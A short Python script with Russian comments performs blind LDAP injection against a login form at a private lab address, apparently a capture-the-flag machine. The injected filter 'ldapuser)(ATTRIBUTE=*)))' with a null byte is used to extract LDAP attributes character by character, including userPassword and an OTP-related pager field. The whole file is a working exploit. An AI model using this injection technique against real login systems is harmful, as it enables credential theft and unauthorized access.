#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 brute.py

import re
import time
from datetime import timedelta
from string import ascii_lowercase, digits
from urllib.parse import quote_plus

import requests

URL = 'http://10.10.10.122/login.php'

ATTRIBUTES = [
	'mail',
	'cn',
	'uid',
	'userPassword',
	'sn',
	'pager'
]

timestart = time.time()
print()

for a in ATTRIBUTES:
	attr, done = '', False

	while not done:
		if a == 'pager':
			charset = digits
		else:
			charset = ascii_lowercase + digits + '_-@.'

		for c in charset:
			# Инъекция вида "ldapuser)(<ATTRIBUTE>=*)))%00"
			inject = f'ldapuser{quote_plus(")(")}{a}{quote_plus("=")}{attr}{c}{quote_plus("*)))")}'

			data = {
				'inputUsername': inject + '%00',
				'inputOTP': '31337'
			}

			resp = requests.post(URL, data=data)

			match = re.search(r'<div class="col-sm-10">(.*?)</div>', resp.text, re.DOTALL)
			if match.group(1).strip() == 'Cannot login':
				attr += c
				break

			print(f'[*] {a}: {attr}{c}', end='\r')
			time.sleep(1)

		else:
			done = True

	print(f'[+] {a}: {attr} ')

print(f'\n[*] Затрачено: {timedelta(seconds=time.time() - timestart)}')
